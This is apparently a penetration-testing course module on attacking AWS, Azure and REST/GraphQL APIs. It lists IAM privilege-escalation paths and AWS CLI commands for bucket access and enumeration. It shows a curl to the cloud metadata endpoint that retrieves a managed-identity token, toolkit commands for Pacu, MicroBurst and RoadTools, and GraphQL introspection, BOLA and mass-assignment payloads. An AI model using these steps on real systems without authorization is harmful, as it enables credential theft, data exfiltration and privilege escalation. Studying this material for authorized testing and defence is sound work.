# Module 07: Cloud Penetration Testing (AWS & Azure) & API Hacking

Technical guide for assessing AWS, Microsoft Azure, and modern REST/GraphQL APIs.

---

## 1. AWS Penetration Testing

### 1. Identity & Access Management (IAM) Privilege Escalation
Common misconfigured IAM permissions allowing privilege escalation:
- **`iam:CreatePolicyVersion`**: An attacker can create a new version of an existing policy containing `"Effect": "Allow", "Action": "*", "Resource": "*"`.
- **`iam:SetDefaultPolicyVersion`**: Switch active policy to an older version that had admin privileges.
- **`iam:AttachUserPolicy`** or **`iam:AttachRolePolicy`**: Directly attach the `AdministratorAccess` AWS managed policy.
- **`iam:PassRole` + `ec2:RunInstances`**: Launch an EC2 instance with an attached IAM role that has administrative permissions, then connect to the instance to steal role credentials from metadata.

### 2. AWS CLI Enumeration Commands
```bash
# Verify credentials and active identity
aws sts get-caller-identity

# List S3 buckets and test unauthenticated access
aws s3 ls
aws s3 sync s3://target-confidential-bucket ./downloaded/

# Enumerate user policies
aws iam list-attached-user-policies --user-name compromised-user
aws iam list-user-policies --user-name compromised-user
```

### 3. Automated Auditing
```bash
# Prowler (Cloud security benchmark assessment)
prowler aws --compliance cis_1.4_aws

# Pacu (AWS exploitation framework by Rhino Security Labs)
pacu
# Inside pacu:
set_keys
run iam__enum_permissions
run iam__privesc_scan
```

---

## 2. Microsoft Azure & Entra ID (Azure AD)

### 1. Key Attack Surfaces
- **App Registrations & Service Principals**: Exposed client secrets or certificates in source code or CI/CD pipelines.
- **Managed Identities**: System-assigned identities on Azure VMs or App Services accessible via internal metadata endpoint:
  ```bash
  curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true
  ```

### 2. Azure Pentesting Toolkit
```powershell
# MicroBurst PowerShell toolkit
Import-Module .\MicroBurst.psm1
Get-AzureDomainInfo -Domain target.com
Find-AzureBlobs -Base target

# RoadTools (Graph database mapping of Azure AD)
roadrecon auth -u 'user@tenant.onmicrosoft.com' -p 'Pass123'
roadrecon gather
roadrecon gui
```

---

## 3. Modern API Hacking (REST & GraphQL)

### 1. GraphQL Security Testing
- **Introspection Enabled**: Send full schema dump query to discover hidden queries and mutations:
  ```json
  {"query": "{ __schema { types { name fields { name } } } }"}
  ```
- **Inql & Clairvoyance**:
  ```bash
  # Dump GraphQL schema and generate Burp endpoints
  clairvoyance http://target.com/graphql -o schema.json
  ```
- **Batching & Rate Limit Bypass**:
  Send an array of mutation objects in a single HTTP request to bypass brute-force limits.

### 2. REST API Vulnerabilities (OWASP API Top 10)
- **BOLA (Broken Object Level Authorization)**:
  `GET /api/v1/orders/1004` -> Replace with `1005` without server checking session ownership.
- **Mass Assignment**:
  Submitting extra JSON parameters on user creation or update:
  ```json
  {
    "username": "attacker",
    "email": "attacker@test.com",
    "is_admin": true,
    "role": "SuperAdmin"
  }
  ```
